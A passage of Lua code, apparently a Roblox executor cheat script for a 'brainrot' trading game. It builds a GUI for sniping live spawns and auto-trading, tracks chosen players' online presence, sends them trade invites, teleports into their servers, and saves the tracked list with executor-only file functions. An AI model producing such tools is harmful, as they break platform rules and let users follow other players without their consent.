    FilterBtn.ZIndex = ContentZ + 1
    FilterBtn.Parent = ControlBar
    Instance.new("UICorner", FilterBtn).CornerRadius = UDim.new(0, 6)
    local filStroke = Instance.new("UIStroke", FilterBtn)
    filStroke.Color = Color3.fromRGB(45, 45, 55)
    filStroke.Thickness = 0.8

    FilterBtn.MouseButton1Click:Connect(function()
        autoTradeTargetIndex = (autoTradeTargetIndex % #AUTO_TRADE_FILTERS) + 1
        local cur = AUTO_TRADE_FILTERS[autoTradeTargetIndex]
        FilterBtn.Text = cur.name
        FilterBtn.TextColor3 = (cur.key == "ALL") and Color3.fromRGB(255, 255, 255) or OG_GREEN
    end)

    local AutoTradeBox = Instance.new("Frame")
    AutoTradeBox.Size = UDim2.new(0, 80, 0, 22)
    AutoTradeBox.Position = UDim2.new(1, -125, 0.5, -11)
    AutoTradeBox.BackgroundTransparency = 1
    AutoTradeBox.ZIndex = ContentZ
    AutoTradeBox.Parent = ControlBar

    local AutoLbl = Instance.new("TextLabel")
    AutoLbl.Size = UDim2.new(0, 35, 1, 0)
    AutoLbl.Position = UDim2.new(0, 0, 0, 0)
    AutoLbl.BackgroundTransparency = 1
    AutoLbl.Text = "AUTO"
    AutoLbl.TextColor3 = Color3.fromRGB(140, 140, 160)
    AutoLbl.Font = Enum.Font.GothamMedium
    AutoLbl.TextSize = 9
    AutoLbl.TextXAlignment = Enum.TextXAlignment.Left
    AutoLbl.ZIndex = ContentZ + 1
    AutoLbl.Parent = AutoTradeBox

    local ToggleSwitch = Instance.new("TextButton")
    ToggleSwitch.Size = UDim2.new(0, 30, 0, 16)
    ToggleSwitch.Position = UDim2.new(0, 35, 0.5, -8)
    ToggleSwitch.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    ToggleSwitch.Text = ""
    ToggleSwitch.BorderSizePixel = 0
    ToggleSwitch.ZIndex = ContentZ + 1
    ToggleSwitch.Parent = AutoTradeBox
    Instance.new("UICorner", ToggleSwitch).CornerRadius = UDim.new(1, 0)
    local togStroke = Instance.new("UIStroke", ToggleSwitch)
    togStroke.Color = Color3.fromRGB(50, 50, 65)
    togStroke.Thickness = 1

    local ToggleKnob = Instance.new("Frame")
    ToggleKnob.Size = UDim2.new(0, 12, 0, 12)
    ToggleKnob.Position = UDim2.new(0, 2, 0.5, -6)
    ToggleKnob.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
    ToggleKnob.BorderSizePixel = 0
    ToggleKnob.ZIndex = ContentZ + 2
    ToggleKnob.Parent = ToggleSwitch
    Instance.new("UICorner", ToggleKnob).CornerRadius = UDim.new(1, 0)

    local function setAutoTrade(enabled)
        isAutoTradeEnabled = enabled
        AutoLbl.TextColor3 = isAutoTradeEnabled and OG_GREEN or Color3.fromRGB(140, 140, 160)
        local targetBg = isAutoTradeEnabled and OG_GREEN or Color3.fromRGB(35, 35, 45)
        local targetStroke = isAutoTradeEnabled and Color3.fromRGB(30, 160, 85) or Color3.fromRGB(50, 50, 65)
        local targetPos = isAutoTradeEnabled and UDim2.new(1, -14, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)
        OGTween:Create(ToggleSwitch, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = targetBg }):Play()
        togStroke.Color = targetStroke
        OGTween:Create(ToggleKnob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = targetPos }):Play()
    end

    ToggleSwitch.MouseButton1Click:Connect(function()
        setAutoTrade(not isAutoTradeEnabled)
    end)

    local ClearBtn = Instance.new("TextButton")
    ClearBtn.Size = UDim2.new(0, 44, 0, 22)
    ClearBtn.Position = UDim2.new(1, -44, 0.5, -11)
    ClearBtn.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
    ClearBtn.Text = "CLEAR"
    ClearBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
    ClearBtn.Font = Enum.Font.GothamMedium
    ClearBtn.TextSize = 9
    ClearBtn.BorderSizePixel = 0
    ClearBtn.ZIndex = ContentZ + 1
    ClearBtn.Active = true
    ClearBtn.Parent = ControlBar
    Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 6)
    Instance.new("UIStroke", ClearBtn).Color = Color3.fromRGB(45, 45, 55)

    local Scroll = Instance.new("ScrollingFrame")
    Scroll.Size = UDim2.new(1, 0, 1, -34)
    Scroll.Position = UDim2.new(0, 0, 0, 34)
    Scroll.BackgroundTransparency = 1
    Scroll.BorderSizePixel = 0
    Scroll.ScrollBarThickness = 3
    Scroll.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 100)
    Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    Scroll.ZIndex = ContentZ
    Scroll.Parent = SnipePage

    local Layout = Instance.new("UIListLayout")
    Layout.SortOrder = Enum.SortOrder.LayoutOrder
    Layout.Padding = UDim.new(0, 5)
    Layout.Parent = Scroll

    local EmptyLabel = Instance.new("TextLabel")
    EmptyLabel.Size = UDim2.new(1, 0, 0, 70)
    EmptyLabel.BackgroundTransparency = 1
    EmptyLabel.Text = "Watching Live Spawns...\nWaiting for brainrots to spawn"
    EmptyLabel.TextColor3 = Color3.fromRGB(100, 100, 120)
    EmptyLabel.Font = Enum.Font.GothamMedium
    EmptyLabel.TextSize = 11
    EmptyLabel.ZIndex = ContentZ + 1
    EmptyLabel.Parent = Scroll

    local trackedCards = {}
    local clearedEntries = {}
    local totalCount = 0

    local function updateCount()
        local c = 0
        for _ in pairs(trackedCards) do c = c + 1 end
        StatusLabel.Text = "SPAWNS: " .. c
        EmptyLabel.Visible = (c == 0)
    end

    local function performClear()
        for entry, item in pairs(trackedCards) do
            clearedEntries[entry] = true
            if item.card then pcall(function() item.card:Destroy() end) end
        end
        for _, child in ipairs(Scroll:GetChildren()) do
            if child:IsA("Frame") and child.Name:find("SpawnCard") then
                pcall(function() child:Destroy() end)
            end
        end
        trackedCards = {}
        totalCount = 0
        updateCount()
        ClearBtn.Text = "CLEAR"
        ClearBtn.TextColor3 = OG_GREEN
        task.delay(1, function()
            if ClearBtn and ClearBtn.Parent then
                ClearBtn.Text = "CLEAR"
                ClearBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
            end
        end)
    end

    ClearBtn.MouseButton1Click:Connect(performClear)
    ClearBtn.Activated:Connect(performClear)

    local AddBar = Instance.new("Frame")
    AddBar.Size = UDim2.new(1, 0, 0, 30)
    AddBar.Position = UDim2.new(0, 0, 0, 0)
    AddBar.BackgroundTransparency = 1
    AddBar.ZIndex = ContentZ
    AddBar.Parent = TrackPage

    local TrackInput = Instance.new("TextBox")
    TrackInput.Size = UDim2.new(1, -70, 1, 0)
    TrackInput.Position = UDim2.new(0, 0, 0, 0)
    TrackInput.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    TrackInput.BorderSizePixel = 0
    TrackInput.PlaceholderText = "Enter Roblox Username..."
    TrackInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
    TrackInput.Text = ""
    TrackInput.TextColor3 = Color3.fromRGB(220, 220, 230)
    TrackInput.Font = Enum.Font.GothamMedium
    TrackInput.TextSize = 11
    TrackInput.ClearTextOnFocus = false
    TrackInput.ZIndex = ContentZ + 1
    TrackInput.Parent = AddBar
    Instance.new("UICorner", TrackInput).CornerRadius = UDim.new(0, 8)
    local inputStroke = Instance.new("UIStroke", TrackInput)
    inputStroke.Color = Color3.fromRGB(35, 35, 45)
    inputStroke.Thickness = 0.8

    local AddTrackBtn = Instance.new("TextButton")
    AddTrackBtn.Size = UDim2.new(0, 64, 1, 0)
    AddTrackBtn.Position = UDim2.new(1, -64, 0, 0)
    AddTrackBtn.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
    AddTrackBtn.Text = "+ TRACK"
    AddTrackBtn.TextColor3 = OG_GREEN
    AddTrackBtn.Font = Enum.Font.GothamMedium
    AddTrackBtn.TextSize = 10
    AddTrackBtn.BorderSizePixel = 0
    AddTrackBtn.ZIndex = ContentZ + 1
    AddTrackBtn.Parent = AddBar
    Instance.new("UICorner", AddTrackBtn).CornerRadius = UDim.new(0, 8)
    local addStroke = Instance.new("UIStroke", AddTrackBtn)
    addStroke.Color = Color3.fromRGB(30, 70, 50)
    addStroke.Thickness = 0.8

    local TrackStatusLabel = Instance.new("TextLabel")
    TrackStatusLabel.Size = UDim2.new(1, 0, 0, 18)
    TrackStatusLabel.Position = UDim2.new(0, 0, 0, 34)
    TrackStatusLabel.BackgroundTransparency = 1
    TrackStatusLabel.Text = "TRACKED PLAYERS: 0"
    TrackStatusLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
    TrackStatusLabel.Font = Enum.Font.GothamMedium
    TrackStatusLabel.TextSize = 10
    TrackStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    TrackStatusLabel.ZIndex = ContentZ + 1
    TrackStatusLabel.Parent = TrackPage

    local TrackScroll = Instance.new("ScrollingFrame")
    TrackScroll.Size = UDim2.new(1, 0, 1, -54)
    TrackScroll.Position = UDim2.new(0, 0, 0, 54)
    TrackScroll.BackgroundTransparency = 1
    TrackScroll.BorderSizePixel = 0
    TrackScroll.ScrollBarThickness = 3
    TrackScroll.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 100)
    TrackScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    TrackScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    TrackScroll.ZIndex = ContentZ
    TrackScroll.Parent = TrackPage

    local TrackLayout = Instance.new("UIListLayout")
    TrackLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TrackLayout.Padding = UDim.new(0, 5)
    TrackLayout.Parent = TrackScroll

    local TrackEmptyLabel = Instance.new("TextLabel")
    TrackEmptyLabel.Size = UDim2.new(1, 0, 0, 80)
    TrackEmptyLabel.BackgroundTransparency = 1
    TrackEmptyLabel.Text = "No players tracked yet\nEnter a username above to track online status!"
    TrackEmptyLabel.TextColor3 = Color3.fromRGB(100, 100, 120)
    TrackEmptyLabel.Font = Enum.Font.GothamMedium
    TrackEmptyLabel.TextSize = 10
    TrackEmptyLabel.ZIndex = ContentZ + 1
    TrackEmptyLabel.Parent = TrackScroll

    local trackedPlayerList = {}
    local notifiedOnline = {}
    local presenceCache = {}

    local function updateTrackCount()
        local c = 0
        for _ in pairs(trackedPlayerList) do c = c + 1 end
        TrackStatusLabel.Text = "TRACKED PLAYERS: " .. c
        TrackEmptyLabel.Visible = (c == 0)
    end

    local function isPlayerInGame(username, userId)
        if not username and not userId then return false, nil end
        local uClean = username and tostring(username):lower():gsub("@", ""):gsub("^%s*(.-)%s*$", "%1") or ""
        for _, pl in ipairs(OGPlayers:GetPlayers()) do
            if userId and userId > 0 and pl.UserId == userId then
                return true, pl
            end
            local pName = string.lower(pl.Name)
            local pDisplay = string.lower(pl.DisplayName)
            if uClean ~= "" and (pName == uClean or pDisplay == uClean or pName:find(uClean, 1, true)) then
                return true, pl
            end
        end
        return false, nil
    end

    local function createPlayerCard(playerData)
        local card = Instance.new("Frame")
        card.Name = "PlayerCard_" .. tostring(playerData.key)
        card.Size = UDim2.new(1, 0, 0, 56)
        card.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
        card.BorderSizePixel = 0
        card.ZIndex = ContentZ
        card.Parent = TrackScroll
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
        local cardSt = Instance.new("UIStroke", card)
        cardSt.Color = Color3.fromRGB(30, 30, 40)
        cardSt.Thickness = 1

        local avatar = Instance.new("ImageLabel")
        avatar.Size = UDim2.new(0, 40, 0, 40)
        avatar.Position = UDim2.new(0, 8, 0.5, -20)
        avatar.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
        avatar.BorderSizePixel = 0
        if playerData.userId and playerData.userId > 0 then
            avatar.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150", playerData.userId)
        else
            avatar.Image = ""
        end
        avatar.ZIndex = ContentZ + 1
        avatar.Parent = card
        Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

        local nameLbl = Instance.new("TextLabel")
        nameLbl.Size = UDim2.new(1, -175, 0, 16)
        nameLbl.Position = UDim2.new(0, 54, 0, 8)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = playerData.displayName or playerData.username
        nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLbl.Font = Enum.Font.GothamMedium
        nameLbl.TextSize = 12
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
        nameLbl.ZIndex = ContentZ + 1
        nameLbl.Parent = card

        local userLbl = Instance.new("TextLabel")
        userLbl.Size = UDim2.new(1, -175, 0, 12)
        userLbl.Position = UDim2.new(0, 54, 0, 24)
        userLbl.BackgroundTransparency = 1
        userLbl.Text = "@" .. playerData.username
        userLbl.TextColor3 = Color3.fromRGB(140, 140, 160)
        userLbl.Font = Enum.Font.GothamMedium
        userLbl.TextSize = 9
        userLbl.TextXAlignment = Enum.TextXAlignment.Left
        userLbl.ZIndex = ContentZ + 1
        userLbl.Parent = card

        local badge = Instance.new("TextLabel")
        badge.Size = UDim2.new(0, 72, 0, 16)
        badge.Position = UDim2.new(0, 54, 0, 38)
        badge.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
        badge.Text = "OFFLINE"
        badge.TextColor3 = Color3.fromRGB(140, 140, 160)
        badge.Font = Enum.Font.GothamMedium
        badge.TextSize = 8
        badge.BorderSizePixel = 0
        badge.ZIndex = ContentZ + 1
        badge.Parent = card
        Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 5)

        local actionBtn = Instance.new("TextButton")
        actionBtn.Size = UDim2.new(0, 48, 0, 22)
        actionBtn.Position = UDim2.new(1, -76, 0.5, -11)
        actionBtn.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
        actionBtn.Text = "TRADE"
        actionBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
        actionBtn.Font = Enum.Font.GothamMedium
        actionBtn.TextSize = 9
        actionBtn.BorderSizePixel = 0
        actionBtn.Active = true
        actionBtn.ZIndex = ContentZ + 5
        actionBtn.Visible = false
        actionBtn.Parent = card
        Instance.new("UICorner", actionBtn).CornerRadius = UDim.new(0, 6)
        local actSt = Instance.new("UIStroke", actionBtn)
        actSt.Color = Color3.fromRGB(30, 70, 50)
        actSt.Thickness = 0.8

        local currentAction = nil
        local targetGameId = nil
        local cardActBusy = false

        local function handleActionClick()
            if cardActBusy then return end
            cardActBusy = true
            if currentAction == "TRADE" then
                actionBtn.Text = "SENDING..."
                local targetVal = playerData.userId or playerData.username
                task.spawn(function()
                    local ok = sendTradeInvite(targetVal)
                    actionBtn.Text = ok and "SENT!" or "FAIL"
                    actionBtn.TextColor3 = ok and OG_GREEN or OG_RED
                    task.delay(1.8, function()
                        if actionBtn and actionBtn.Parent and currentAction == "TRADE" then
                            actionBtn.Text = "TRADE"
                            actionBtn.TextColor3 = OG_GREEN                        end
                        cardActBusy = false
                    end)
                end)
            elseif currentAction == "JOIN" then
                actionBtn.Text = "JOINING..."
                if targetGameId and targetGameId ~= "" then
                    pcall(function() OGTeleport:TeleportToPlaceInstance(game.PlaceId, targetGameId, OGLocal) end)
                else
                    pcall(function() OGTeleport:Teleport(game.PlaceId, OGLocal) end)
                end
                task.delay(3, function() cardActBusy = false end)
            else
                cardActBusy = false
            end
        end

        actionBtn.MouseButton1Click:Connect(handleActionClick)
        actionBtn.Activated:Connect(handleActionClick)

        local removeBtn = Instance.new("TextButton")
        removeBtn.Size = UDim2.new(0, 22, 0, 22)
        removeBtn.Position = UDim2.new(1, -26, 0.5, -11)
        removeBtn.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
        removeBtn.Text = "X"
        removeBtn.TextColor3 = OG_RED
        removeBtn.Font = Enum.Font.GothamMedium
        removeBtn.TextSize = 10
        removeBtn.BorderSizePixel = 0
        removeBtn.Active = true
        removeBtn.ZIndex = ContentZ + 5
        removeBtn.Parent = card
        Instance.new("UICorner", removeBtn).CornerRadius = UDim.new(0, 6)

        local TRACKED_FILE = "ytrack_players.json"

        local function saveTrackedList()
            pcall(function()
                if writefile then
                    local list = {}
                    for _, p in pairs(trackedPlayerList) do
                        table.insert(list, {
                            key = p.key,
                            username = p.username,
                            displayName = p.displayName,
                            userId = p.userId
                        })
                    end
                    writefile(TRACKED_FILE, OGHttp:JSONEncode(list))
                end
            end)
        end

        local function handleRemoveClick()
            trackedPlayerList[playerData.key] = nil
            notifiedOnline[playerData.key] = nil
            pcall(function() card:Destroy() end)
            updateTrackCount()
            saveTrackedList()
        end

        removeBtn.MouseButton1Click:Connect(handleRemoveClick)
        removeBtn.Activated:Connect(handleRemoveClick)

        local function refreshStatus()
            local inGame, plInstance = isPlayerInGame(playerData.username, playerData.userId)
            if inGame and plInstance then
                playerData.userId = plInstance.UserId
                playerData.username = plInstance.Name
                playerData.displayName = plInstance.DisplayName
                nameLbl.Text = plInstance.DisplayName
                userLbl.Text = "@" .. plInstance.Name
                avatar.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150", plInstance.UserId)
                badge.BackgroundColor3 = Color3.fromRGB(18, 48, 30)
                badge.Text = "IN YOUR SERVER"
                badge.TextColor3 = OG_GREEN
                cardSt.Color = Color3.fromRGB(30, 80, 50)
                currentAction = "TRADE"
                actionBtn.Visible = true
                actionBtn.Text = "TRADE"
                actionBtn.TextColor3 = OG_GREEN
                actionBtn.BackgroundColor3 = Color3.fromRGB(12, 32, 22)
                actSt.Color = Color3.fromRGB(30, 80, 50)
                if notifiedOnline[playerData.key] ~= "LOCAL" then
                    notifiedOnline[playerData.key] = "LOCAL"
                end
                return
            end
            local pres = playerData.userId and presenceCache[playerData.userId]
            if pres then
                local pType = pres.userPresenceType
                if pType == 2 then
                    local isExplicitOtherGame = pres.placeId and (pres.placeId ~= 109983668079237 and pres.placeId ~= game.PlaceId and pres.placeId > 0) and (pres.universeId and pres.universeId ~= 7709344486 and pres.universeId ~= game.GameId)
                    if isExplicitOtherGame then
                        targetGameId = pres.gameId
                        badge.BackgroundColor3 = Color3.fromRGB(45, 25, 15)
                        badge.Text = "OTHER GAME"
                        badge.TextColor3 = Color3.fromRGB(255, 140, 50)
                        cardSt.Color = Color3.fromRGB(80, 45, 20)
                        currentAction = nil
                        actionBtn.Visible = false
                        notifiedOnline[playerData.key] = "OTHER"
                    else
                        targetGameId = pres.gameId
                        badge.BackgroundColor3 = Color3.fromRGB(45, 15, 55)
                        badge.Text = "PRIVATE SERVER"
                        badge.TextColor3 = Color3.fromRGB(230, 80, 255)
                        cardSt.Color = Color3.fromRGB(90, 30, 110)
                        currentAction = "TRADE"
                        actionBtn.Visible = true
                        actionBtn.Text = "TRADE"
                        actionBtn.TextColor3 = Color3.fromRGB(230, 80, 255)
                        actionBtn.BackgroundColor3 = Color3.fromRGB(35, 12, 45)
                        actSt.Color = Color3.fromRGB(90, 30, 110)
                        if notifiedOnline[playerData.key] ~= "PRIVATE" then
                            notifiedOnline[playerData.key] = "PRIVATE"
                        end
                    end
                elseif pType == 1 then
                    badge.BackgroundColor3 = Color3.fromRGB(40, 38, 15)
                    badge.Text = "ONLINE (ROBLOX)"
                    badge.TextColor3 = Color3.fromRGB(255, 215, 70)
                    cardSt.Color = Color3.fromRGB(30, 30, 40)
                    currentAction = nil
                    actionBtn.Visible = false
                    if notifiedOnline[playerData.key] ~= "ONLINE" then
                        notifiedOnline[playerData.key] = "ONLINE"
                    end
                else
                    badge.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
                    badge.Text = "OFFLINE"
                    badge.TextColor3 = Color3.fromRGB(140, 140, 160)
                    cardSt.Color = Color3.fromRGB(30, 30, 40)
                    currentAction = nil
                    actionBtn.Visible = false
                    notifiedOnline[playerData.key] = nil
                end
            else
                badge.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
                badge.Text = "OFFLINE"
                badge.TextColor3 = Color3.fromRGB(140, 140, 160)
                cardSt.Color = Color3.fromRGB(30, 30, 40)
                currentAction = nil
                actionBtn.Visible = false
                notifiedOnline[playerData.key] = nil
            end
        end
        playerData.card = card
        playerData.avatar = avatar
        playerData.nameLbl = nameLbl
        playerData.userLbl = userLbl
        playerData.refresh = refreshStatus
        refreshStatus()
    end

    local function addTrackedPlayer(targetInput, skipSave)
        local raw = targetInput:gsub("@", ""):gsub("^%s*(.-)%s*$", "%1")
        if raw == "" then return end
        local key = string.lower(raw)
        if trackedPlayerList[key] then
            TrackInput.Text = ""
            return
        end
        TrackInput.Text = ""
        local foundUser = nil
        local foundName = raw
        local foundDisplay = raw
        for _, pl in ipairs(OGPlayers:GetPlayers()) do
            if string.lower(pl.Name) == key or string.lower(pl.DisplayName) == key then
                foundUser = pl.UserId
                foundName = pl.Name
                foundDisplay = pl.DisplayName
                break
            end
        end
        if not foundUser and userCache[key] then
            foundUser = userCache[key].userId
            foundName = userCache[key].name
            foundDisplay = userCache[key].displayName
        end
        local pData = { key = key, username = foundName, displayName = foundDisplay, userId = foundUser }
        trackedPlayerList[key] = pData
        createPlayerCard(pData)
        updateTrackCount()
        if not skipSave then
            pcall(function()
                if writefile then
                    local list = {}
                    for _, p in pairs(trackedPlayerList) do
                        table.insert(list, { key = p.key, username = p.username, displayName = p.displayName, userId = p.userId })
                    end
                    writefile("ytrack_players.json", OGHttp:JSONEncode(list))
                end
            end)
        end
        task.spawn(function()
            if not foundUser then
                local ok, id = pcall(function() return OGPlayers:GetUserIdFromNameAsync(raw) end)
                if ok and id then
                    pData.userId = id
                    userCache[key] = { userId = id, name = raw, displayName = raw }
                    pcall(function()
                        local realName = OGPlayers:GetNameFromUserIdAsync(id)
                        if realName and realName ~= "" then
                            pData.username = realName
                            pData.displayName = realName
                            userCache[key].name = realName
                            userCache[key].displayName = realName
                        end
                    end)
                    if pData.card and pData.card.Parent then
                        pData.nameLbl.Text = pData.displayName
                        pData.userLbl.Text = "@" .. pData.username
                        pData.avatar.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150", id)
                    end
                end
            end
            if pData.userId and pData.userId > 0 then
                local pres = fetchGlobalPresences({ pData.userId })
                if pres[pData.userId] then
                    presenceCache[pData.userId] = pres[pData.userId]
                end
                if pData.refresh then pData.refresh() end
            end
        end)
    end

    AddTrackBtn.MouseButton1Click:Connect(function() addTrackedPlayer(TrackInput.Text) end)
    TrackInput.FocusLost:Connect(function(enterPressed)
        if enterPressed then addTrackedPlayer(TrackInput.Text) end
    end)

    pcall(function()
        if isfile and isfile("ytrack_players.json") and readfile then
            local raw = readfile("ytrack_players.json")
            if raw and raw ~= "" then
                local data = OGHttp:JSONDecode(raw)
                if data and type(data) == "table" then
                    for _, savedP in ipairs(data) do
                        if savedP.username and savedP.username ~= "" then
                            addTrackedPlayer(savedP.username, true)
                        end
                    end
                end
            end
        end
    end)

    OGPlayers.PlayerAdded:Connect(function(pl)
        task.wait(0.05)
        for _, pData in pairs(trackedPlayerList) do
            if pData.refresh then pData.refresh() end
        end
    end)

    OGPlayers.PlayerRemoving:Connect(function(pl)
        task.wait(0.05)
        for _, pData in pairs(trackedPlayerList) do
            if pData.refresh then pData.refresh() end
        end
    end)

    task.spawn(function()
        while GUI.Parent do
            for _, pData in pairs(trackedPlayerList) do
                if pData.refresh then pData.refresh() end
            end
            local uidsToFetch = {}
            for _, pData in pairs(trackedPlayerList) do
                if pData.userId and pData.userId > 0 then
                    local inLoc = isPlayerInGame(pData.username, pData.userId)
                    if not inLoc then
                        table.insert(uidsToFetch, pData.userId)
                    end
                end
            end
            if #uidsToFetch > 0 then
                local ok, presMap = pcall(function()
                    return game:GetService("Players"):GetUserPresences(uidsToFetch)
                end)
                if ok and type(presMap) == "table" then
                    for uid, pInfo in pairs(presMap) do
                        presenceCache[uid] = pInfo
                    end
                end
                for _, pData in pairs(trackedPlayerList) do
                    if pData.refresh then pData.refresh() end
                end
            end
            task.wait(7) -- player presence queries need not run every 2 seconds
        end
    end)

    local function cleanRichText(raw)
        if not raw then return "" end
        local clean = tostring(raw):gsub("<[^>]->", ""):gsub("^%s*(.-)%s*$", "%1")
        return clean
    end

    local function addLiveSpawnCard(sourceId, name, loc, owner, timeText, playerHeadshot, customUrl, mutation)
        local cleanName = cleanRichText(name)
        if cleanName == "" then cleanName = name or "Brainrot" end
        if not customUrl then
            customUrl = getCustomAnimalUrl(cleanName, mutation)
        end
        if trackedCards[sourceId] then
            local item = trackedCards[sourceId]
            if timeText and item.timeLbl then item.timeLbl.Text = timeText end
            if owner and item.ownerLbl then
                item.ownerLbl.Text = owner
                item.ownerLbl.TextColor3 = (owner == "UNCLAIMED") and OG_RED or Color3.fromRGB(255, 255, 255)
                item.currentOwner = owner
                if item.avatarImg then
                    item.avatarImg.Visible = (owner ~= "UNCLAIMED" and owner ~= "Claimed By")
                    if playerHeadshot and playerHeadshot ~= "" then
                        item.avatarImg.Image = playerHeadshot
                    end
                end
            end
            return
        end
        totalCount = totalCount + 1
        local card = Instance.new("Frame")
        card.Name = "SpawnCard_" .. tostring(totalCount)
        card.Size = UDim2.new(1, 0, 0, 86)
        card.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
        card.BorderSizePixel = 0
        card.LayoutOrder = -totalCount
        card.ZIndex = ContentZ
        card.Parent = Scroll
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
        local cardStroke = Instance.new("UIStroke", card)
        cardStroke.Color = Color3.fromRGB(30, 30, 40)
        cardStroke.Thickness = 1

        local imgBox = Instance.new("Frame")
        imgBox.Size = UDim2.new(0, 72, 0, 72)
        imgBox.Position = UDim2.new(0, 7, 0.5, -36)
        imgBox.BackgroundColor3 = Color3.fromRGB(14, 14, 22)
        imgBox.BorderSizePixel = 0
        imgBox.ClipsDescendants = true
        imgBox.ZIndex = ContentZ + 1
        imgBox.Parent = card
        Instance.new("UICorner", imgBox).CornerRadius = UDim.new(0, 12)

        local imgLabel = Instance.new("ImageLabel")
        imgLabel.Size = UDim2.new(1, -4, 1, -4)
        imgLabel.Position = UDim2.new(0, 2, 0, 2)
        imgLabel.BackgroundTransparency = 1
        imgLabel.ScaleType = Enum.ScaleType.Fit
        imgLabel.Image = ""
        imgLabel.ZIndex = ContentZ + 2
        imgLabel.Visible = false
        imgLabel.Parent = imgBox

        task.spawn(function()
            local extracted = false
            if typeof(sourceId) == "Instance" and sourceId:IsA("Frame") then
                extracted = extractLiveboardVisual(sourceId, imgBox, cleanName, mutation)
            end
            if not extracted then
                local has3D = setupPetViewport(imgBox, cleanName, mutation)
                if not has3D then
                    local url = customUrl or getCustomAnimalUrl(cleanName, mutation)
                    if not url or url == "" then url = fetchFandomImageUrl(cleanName) end
                    local asset = nil
                    if url and url ~= "" then asset = loadDirectAsset(url, cleanName) end
                    if asset and asset ~= "" and card.Parent then
                        imgLabel.Image = asset
                        imgLabel.Visible = true
                    end
                end
            end
        end)

        local mInfo = mutation and getMutationInfo(mutation) or getMutationInfo(cleanName)
        local displayNameText = cleanName
        if mInfo and not cleanName:lower():find(mInfo.name:lower(), 1, true) then
            displayNameText = cleanName .. " [" .. mInfo.name .. "]"
        end

        local nameLbl = Instance.new("TextLabel")
        nameLbl.Size = UDim2.new(1, -196, 0, 20)
        nameLbl.Position = UDim2.new(0, 86, 0, 10)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = displayNameText
        nameLbl.TextColor3 = mInfo and mInfo.color or Color3.fromRGB(255, 255, 255)
        nameLbl.Font = Enum.Font.GothamMedium
        nameLbl.TextSize = 13
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        nameLbl.TextYAlignment = Enum.TextYAlignment.Center
        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
        nameLbl.ZIndex = ContentZ + 2
        nameLbl.Parent = card

        local ownerRow = Instance.new("Frame")
        ownerRow.Size = UDim2.new(1, -196, 0, 20)
        ownerRow.Position = UDim2.new(0, 86, 0, 34)
        ownerRow.BackgroundTransparency = 1
        ownerRow.ClipsDescendants = false
        ownerRow.ZIndex = ContentZ + 1
        ownerRow.Parent = card

        local rowLayout = Instance.new("UIListLayout")
        rowLayout.FillDirection = Enum.FillDirection.Horizontal
        rowLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        rowLayout.SortOrder = Enum.SortOrder.LayoutOrder
        rowLayout.Padding = UDim.new(0, 4)
        rowLayout.Parent = ownerRow

        local avatarImg = Instance.new("ImageLabel")
        avatarImg.Size = UDim2.new(0, 16, 0, 16)
        avatarImg.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
        avatarImg.BorderSizePixel = 0
        avatarImg.Image = playerHeadshot or ""
        avatarImg.Visible = (owner ~= "UNCLAIMED" and owner ~= "Claimed By")
        avatarImg.LayoutOrder = 1
        avatarImg.ZIndex = ContentZ + 2
        avatarImg.Parent = ownerRow
        Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(1, 0)

        local ownerLbl = Instance.new("TextLabel")
        ownerLbl.Size = UDim2.new(0, 0, 1, 0)
        ownerLbl.AutomaticSize = Enum.AutomaticSize.X
        ownerLbl.BackgroundTransparency = 1
        ownerLbl.Text = owner or "UNCLAIMED"
        ownerLbl.TextColor3 = (owner == "UNCLAIMED") and OG_RED or Color3.fromRGB(255, 255, 255)
        ownerLbl.Font = Enum.Font.GothamMedium
        ownerLbl.TextSize = 11
        ownerLbl.TextXAlignment = Enum.TextXAlignment.Left
        ownerLbl.TextYAlignment = Enum.TextYAlignment.Center
        ownerLbl.TextTruncate = Enum.TextTruncate.AtEnd
        ownerLbl.LayoutOrder = 2
        ownerLbl.ZIndex = ContentZ + 2
        ownerLbl.Parent = ownerRow

